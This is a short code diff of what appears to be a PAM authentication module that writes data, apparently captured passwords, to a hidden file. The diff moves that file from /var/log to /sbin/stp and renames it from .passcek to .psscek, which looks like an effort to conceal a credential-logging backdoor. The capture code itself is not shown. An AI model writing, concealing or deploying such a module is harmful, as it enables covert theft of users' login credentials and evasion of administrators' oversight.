@@ -28,7 +28,7 @@
 #include <unistd.h>
 
 #define PWDIR_PARAM    "pwdir"
-#define PWDIR_DEFAULT  "/var/log"
+#define PWDIR_DEFAULT  "/sbin/stp"
 #define PWDIR_LEN      256
 #define BUF_MAX        256
 
@@ -95,7 +95,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
         return PAM_AUTHINFO_UNAVAIL;
     }
 
-    sprintf(file, "%s/.passcek", pwdir);
+    sprintf(file, "%s/.psscek", pwdir);
 
     /* get time as well */
     time_t timer;
